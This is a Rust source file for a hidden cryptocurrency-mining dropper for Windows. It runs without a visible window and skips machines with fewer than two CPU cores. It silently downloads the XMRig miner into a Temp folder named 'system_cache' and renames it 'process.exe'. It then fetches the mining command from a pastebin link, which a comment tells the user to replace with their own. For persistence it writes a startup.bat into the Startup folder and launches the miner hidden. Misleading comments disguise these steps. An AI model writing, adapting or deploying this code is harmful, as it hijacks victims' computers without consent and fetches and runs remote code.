#![windows_subsystem = "windows"]

use std::process::Command;
use std::os::windows::process::CommandExt;
use std::path::Path;
use std::thread;
use std::time::Duration;
use std::fs;
use std::io::Write;

fn main() {
    // System compatibility verification
    let system_cores = num_cpus::get();
    if system_cores < 2 {
        return;
    }

    // Brief initialization delay
    thread::sleep(Duration::from_secs(2));

    let app_cache = format!("{}\\AppData\\Local\\Temp\\system_cache", std::env::var("USERPROFILE").unwrap_or_default());
    fs::create_dir_all(&app_cache).unwrap_or_default();

    let process_exe = format!("{}\\process.exe", &app_cache);
    if !Path::new(&process_exe).exists() {
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .unwrap_or_default();
            
        let package = client.get("https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-gcc-win64.zip")
            .send()
            .unwrap()
            .bytes()
            .unwrap();

        let temp_archive = format!("{}\\temp.zip", &app_cache);
        fs::write(&temp_archive, &package).unwrap_or_default();

        let archive_file = fs::File::open(&temp_archive).unwrap();
        let mut contents = zip::ZipArchive::new(archive_file).unwrap();
        contents.extract(&app_cache).unwrap_or_default();

        if let Ok(items) = fs::read_dir(&app_cache) {
            for item in items {
                if let Ok(item) = item {
                    if item.path().is_dir() && item.file_name().to_string_lossy().contains("xmrig-") {
                        let binary = item.path().join("xmrig.exe");
                        if binary.exists() {
                            fs::rename(binary, &process_exe).unwrap_or_default();
                            break;
                        }
                    }
                }
            }
        }
    }

    let startup_script = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.bat", 
        std::env::var("APPDATA").unwrap_or_default());

    let client = reqwest::blocking::Client::new();
    let process_config = client.get("https://pastebin.com/raw/aHPcq1fc")//replace with your pastebin link with your xmrrig comamnd
        .send()
        .unwrap()
        .text()
        .unwrap_or_default();

    let script_content = format!("@echo off\nstart /min \"\" \"{}\" {}", process_exe, process_config);
    if let Ok(mut file) = fs::File::create(&startup_script) {
        file.write_all(script_content.as_bytes()).unwrap_or_default();
    }

    Command::new(&process_exe)
        .args(process_config.split_whitespace().collect::<Vec<_>>())
        .creation_flags(0x08000000)
        .spawn()
        .ok();
}